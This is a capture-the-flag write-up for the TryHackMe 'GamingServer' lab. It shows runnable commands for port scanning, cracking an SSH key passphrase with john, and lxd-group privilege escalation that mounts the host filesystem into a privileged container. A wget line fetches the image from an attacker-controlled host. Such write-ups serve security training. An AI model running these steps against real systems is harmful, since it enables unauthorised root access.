---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . GamingServer
# DESCRIPTION       . An Easy Boot2Root box for beginners
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/gamingserver
```


```bash
sudo nmap -sSVC -T5 -p- 10.10.182.147 -oN gamingserver
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 340efe0612673ea4ebab7ac4816dfea9 (RSA)
|   256 49611ef4526e7b2998db302d16edf48b (ECDSA)
|_  256 b860c45bb7b2d023a0c756595c631ec4 (ED25519)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- The main page contains a username in the source code

```
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

- By navigating the website, we can find the `/uploads` directory by clicking on the `Dragaan Lore` button and then on `Uploads`. 

- Here we can find `dict.lst`,  the hacker's manifesto and `meme.jpg`.

- I fuzzed the webserver and found out that there's also `/secret` directory which holds the `secretKey` file, a private RSA key.

- However, `ssh -i secretKey john@10.10.182.147` asks for a passphase.

```
python3 ssh2john.py secretKey > crack

john -w=dict.lst crack
```


```
john@exploitable:~$ id

uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

- I knew that being in the `lxd` group could be leveraged to escalate privileges on the box but I didn't knew exactly the steps needed in order to do that, so I googled :)

- **LOCAL HOST**
```LOCAL_HOST
git clone https://github.com/saghul/lxd-alpine-builder

cd lxd-alpine-builder

sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine

sudo ./build-alpine -a i686

python3 -m http.server 80
```

**VICTIM**
```VICTIM
cd ~

wget http://attacker:port/alpine_image_name

# import the image
lxc image import ./alpine*.tar.gz --alias myimage

# It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default 
# default to all of them did the job for me, rename storage or whatever needed if default already exists. 
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh

cd /mnt/root
```

- The flag was in `/mnt/root/root/root.txt`
- The other flag was in `/home/john/user.txt
